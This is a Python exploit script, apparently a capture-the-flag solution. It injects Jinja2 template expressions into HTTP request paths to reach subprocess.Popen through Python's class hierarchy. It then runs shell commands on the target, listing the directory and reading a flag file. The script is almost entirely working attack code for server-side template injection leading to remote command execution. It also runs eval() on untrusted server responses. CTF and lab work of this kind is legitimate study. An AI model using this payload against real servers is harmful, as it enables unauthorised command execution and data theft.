#!/usr/bin/python

import requests
import HTMLParser
import socket
import re
import sys

if len(sys.argv) < 3:
    print("Usage: templated.py <HOST_IP> <PORT>")
    exit()
else:      
    targhost =  sys.argv[1]
    targport = int(sys.argv[2])

def connect():
    s = socket.socket()    
    s.connect((targhost,targport))
    return s    

def get_socket_response(s):
    h = HTMLParser.HTMLParser()
    o = ''        
    while 1:
        b = s.recv(1) 
        if b:
            o += b 
        else:
            s.close()
            break
    res_re = re.findall('<str>(.+?)</str>',o)            
    if res_re:
        o = res_re[0]
    return h.unescape(o)

def cmd(s):
    return s.replace(' ','%20')   

#Debugging previous request with: ''.__class__.__mro__[1].__subclasses__()
#Shows index 414 is the subprocess.Popen() class/method
SUBPROCESS_INDEX = '414'
http_req = """GET /{{{{''.__class__.__mro__[1].__subclasses__()[{index}]{args}}}}} HTTP/1.1\r
Host: {targhost}:{targport}\r
Upgrade-Insecure-Requests: 1\r
\r\n\r\n
"""

r = http_req.format(index=SUBPROCESS_INDEX,
                    targhost=targhost,
                    targport=targport,
                    args='')
                    
subproc_args = "('{cmd}',shell=True,stdout=-1).communicate()"
retries = 2

#Output fails randomly, so retry twice on fail
while retries:
    #First test a directory listing    
    ls_cmd = cmd('ls -al')  
    s1 = connect()
    s1.send(r)
    print("[+] Sent initial request.")
    o1 = get_socket_response(s1)
    #If the output returned has the right string, continue
    if 'subprocess.Popen' in o1:
        print("[*] Found index of subprocess.Popen()...\n")    
        s2 = connect()
        s2.send(http_req.format(index=SUBPROCESS_INDEX,
                            targhost=targhost,
                            targport=targport,
                            args=subproc_args.format(cmd=ls_cmd))
                            )
        #After confirming index, do a test directory listing                            
        o2 = get_socket_response(s2)
        if o2:
            print("[*] Printing directory listing...\n")
            
            #I too like to live dangerously..
            print((eval(o2))[0])

            #Get contents of the flag file
            if 'flag.txt' in o2:
                print("[*] Got flag file. Dumping...")
                s3 = connect()
                cat_cmd = cmd('cat flag.txt')
                s3.send(http_req.format(index=SUBPROCESS_INDEX,
                            targhost=targhost,
                            targport=targport,
                            args=subproc_args.format(cmd=cat_cmd))
                            )
                print("\n{}".format(eval(get_socket_response(s3))[0]))
                print("[+] The end. gg.")
                break                
        else:
            print("[-] Directory listing attempt failed =(")        

    else:
        s1.close()
        retries -=1            
        print("[-] Didn't find subprocess.Popen index. Retrying {} more time(s).")            
